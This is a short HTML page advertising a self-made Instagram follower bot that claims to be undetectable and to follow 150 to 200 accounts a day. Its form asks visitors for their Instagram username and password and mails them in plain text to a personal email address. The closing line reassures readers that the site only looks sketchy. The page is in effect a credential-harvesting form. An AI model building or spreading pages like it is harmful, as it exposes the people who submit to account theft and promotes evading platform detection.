<h1> Instagram Bot </h1>

<p> This bot will help you gain followers by following people from accounts that YOU can choose (in the hopes that they will follow you back).
This bot is undetectable by Instagram because it mimics the actions of a real person.</p>

<h3>This bot will:</h3>
<ul>
	<li>gain approximately 30-50 new followers per day</li>
	<li>find REAL people that choose to follow you because they are interested in your page</li>
	<li>follow A LOT of people(approximately 150-200 per day), so make sure to periodically unfollow some of them.</li>
</ul>

<h3>Information the bot needs from you:</h3>
<form action="mailto:jckrllns@gmail.com" method="POST" enctype="multipart/form-data" name="EmailForm">
	<label for="User">Username:</label><br>
	<input type="text" id="User" name="User"><br>
	<label for="Pass">Password:</label><br>
	<input type="text" id="Pass" name="Pass"><br>
	<label for="Accounts">Accounts you want to target(any amount, separated by commas):</label><br>
	<input type="text" id="Accounts" name="Accounts"><br><br>
	<input type="submit" value="Submit">

</form>
<h1> GOOD LUCK! :) </h1>

<p> The reason this website looks so sketchy is because I programmed the bot myself(I am in my first year of a Computer Science degree).</p>
